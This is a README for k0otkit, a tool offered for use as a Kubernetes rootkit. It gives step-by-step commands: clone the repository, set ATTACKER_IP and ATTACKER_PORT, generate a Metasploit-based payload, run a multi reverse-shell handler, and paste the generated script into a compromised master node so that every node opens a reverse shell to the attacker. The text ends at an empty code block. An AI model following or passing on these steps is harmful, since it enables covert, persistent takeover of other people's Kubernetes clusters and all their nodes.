# k0otkit - Manipulate K8s in a K8s way

## Introduction

k0otkit <- Kubernetes + rootkit



## Usage

Make sure you have got the root shell on the master node of the target Kubernetes. (You can also utilize k0otkit if you have the admin privilege of the target Kubernetes, though you might need to modify the `kubectl` command in `k0otkit_template.sh` to use token or certification.)

Make sure you have installed Metasploit on your attacker host (msfvenom and msfconsole should be available).

**Deploy k0otkit**

Clone this repository:

```bash
git clone https://github.com/brant-ruan/k0otkit
cd k0otkit/
chmod +x ./*.sh
```

Replace the attacker's IP and port in `pre_exp.sh` with your own IP and port:

```bash
ATTACKER_IP=192.168.1.107
ATTACKER_PORT=4444
```

Generate k0otkit:

```bash
./pre_exp.sh
```

`k0otkit.sh` will be generated. Then run the reverse shell handler:

```bash
./handle_multi_reverse_shell.sh
```

Once the handler is ready, copy the content of `k0otkit.sh` and paste it into your shell on the master node of the target Kubernetes, then press `<Enter>` to execute it.

Wait a moment and enjoy reverse shells from all nodes.

P.S. It is not limited how many Kubernetes clusters you manipulate with k0otkit.

**Interact with Shells**

After the successful deployment of k0otkit, you can interact with any reverse shell as you want:

```bash
```